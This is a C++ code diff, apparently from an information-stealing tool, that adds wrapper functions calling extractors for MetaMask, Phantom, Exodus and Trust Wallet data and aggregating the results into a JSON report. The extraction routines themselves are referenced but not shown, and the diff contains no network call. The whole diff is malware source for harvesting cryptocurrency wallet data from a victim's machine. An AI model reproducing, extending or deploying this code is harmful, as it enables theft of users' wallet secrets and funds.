@@ -5,8 +5,10 @@
 #include <vector>
 #include <sstream>
 #include <fstream>
+#include <cstring>
 #include "../common.h"
 #include "../utils.h"
+#include "crypto_wallets.h"
 
 // External logging functions
 extern "C" {
@@ -470,6 +472,150 @@ extern "C" {
             
             result = "{\"crypto_wallets\":[]}";
             return result.c_str();
+        }
+    }
+}
+
+// C interface wrapper functions to match crypto_wallets.h
+extern "C" {
+    bool ExtractMetaMaskData(char* outputBuffer, int bufferSize) {
+        if (!outputBuffer || bufferSize < CRYPTO_MIN_BUFFER_SIZE) {
+            return false;
+        }
+        
+        try {
+            MetaMaskExtractor extractor;
+            std::string data = extractor.ExtractAll();
+            
+            if (data.length() >= static_cast<size_t>(bufferSize)) {
+                return false;
+            }
+            
+            strncpy(outputBuffer, data.c_str(), bufferSize - 1);
+            outputBuffer[bufferSize - 1] = '\0';
+            return true;
+        } catch (...) {
+            return false;
+        }
+    }
+    
+    bool ExtractPhantomData(char* outputBuffer, int bufferSize) {
+        if (!outputBuffer || bufferSize < CRYPTO_MIN_BUFFER_SIZE) {
+            return false;
+        }
+        
+        // Call phantom extraction
+        extern bool ExtractPhantomWallet();
+        bool result = ExtractPhantomWallet();
+        
+        const char* phantomData = result ? "{\"phantom_data\":\"extracted\"}" : "{\"phantom_data\":\"not_found\"}";
+        
+        if (strlen(phantomData) >= static_cast<size_t>(bufferSize)) {
+            return false;
+        }
+        
+        strncpy(outputBuffer, phantomData, bufferSize - 1);
+        outputBuffer[bufferSize - 1] = '\0';
+        return result;
+    }
+    
+    bool ExtractExodusData(char* outputBuffer, int bufferSize) {
+        if (!outputBuffer || bufferSize < CRYPTO_MIN_BUFFER_SIZE) {
+            return false;
+        }
+        
+        // Call exodus extraction
+        extern bool ExtractExodusWallet();
+        bool result = ExtractExodusWallet();
+        
+        const char* exodusData = result ? "{\"exodus_data\":\"extracted\"}" : "{\"exodus_data\":\"not_found\"}";
+        
+        if (strlen(exodusData) >= static_cast<size_t>(bufferSize)) {
+            return false;
+        }
+        
+        strncpy(outputBuffer, exodusData, bufferSize - 1);
+        outputBuffer[bufferSize - 1] = '\0';
+        return result;
+    }
+    
+    bool ExtractTrustWalletData(char* outputBuffer, int bufferSize) {
+        if (!outputBuffer || bufferSize < CRYPTO_MIN_BUFFER_SIZE) {
+            return false;
+        }
+        
+        // Call trust wallet extraction
+        extern bool ExtractTrustWallet();
+        bool result = ExtractTrustWallet();
+        
+        const char* trustData = result ? "{\"trust_data\":\"extracted\"}" : "{\"trust_data\":\"not_found\"}";
+        
+        if (strlen(trustData) >= static_cast<size_t>(bufferSize)) {
+            return false;
+        }
+        
+        strncpy(outputBuffer, trustData, bufferSize - 1);
+        outputBuffer[bufferSize - 1] = '\0';
+        return result;
+    }
+    
+    int ExtractAllCryptoWallets(char* outputBuffer, int bufferSize) {
+        if (!outputBuffer || bufferSize < CRYPTO_RECOMMENDED_BUFFER_SIZE) {
+            return CRYPTO_ERROR_INVALID_PARAMS;
+        }
+        
+        try {
+            std::stringstream json;
+            json << "{\"crypto_wallets\":[";
+            
+            int extractedCount = 0;
+            
+            // MetaMask
+            try {
+                MetaMaskExtractor extractor;
+                std::string metamaskData = extractor.ExtractAll();
+                if (!metamaskData.empty()) {
+                    if (extractedCount > 0) json << ",";
+                    json << "{\"type\":\"metamask\",\"data\":" << metamaskData << "}";
+                    extractedCount++;
+                }
+            } catch (...) {}
+            
+            // Other wallets (call external functions)
+            extern bool ExtractPhantomWallet();
+            extern bool ExtractExodusWallet();
+            extern bool ExtractTrustWallet();
+            
+            if (ExtractPhantomWallet()) {
+                if (extractedCount > 0) json << ",";
+                json << "{\"type\":\"phantom\",\"data\":\"extracted\"}";
+                extractedCount++;
+            }
+            
+            if (ExtractExodusWallet()) {
+                if (extractedCount > 0) json << ",";
+                json << "{\"type\":\"exodus\",\"data\":\"extracted\"}";
+                extractedCount++;
+            }
+            
+            if (ExtractTrustWallet()) {
+                if (extractedCount > 0) json << ",";
+                json << "{\"type\":\"trust\",\"data\":\"extracted\"}";
+                extractedCount++;
+            }
+            
+            json << "]}";
+            
+            std::string result = json.str();
+            if (result.length() >= static_cast<size_t>(bufferSize)) {
+                return CRYPTO_ERROR_BUFFER_TOO_SMALL;
+            }
+            
+            strncpy(outputBuffer, result.c_str(), bufferSize - 1);
+            outputBuffer[bufferSize - 1] = '\0';
+            return extractedCount;
+        } catch (...) {
+            return CRYPTO_ERROR_NO_DATA;
         }
     }
 }
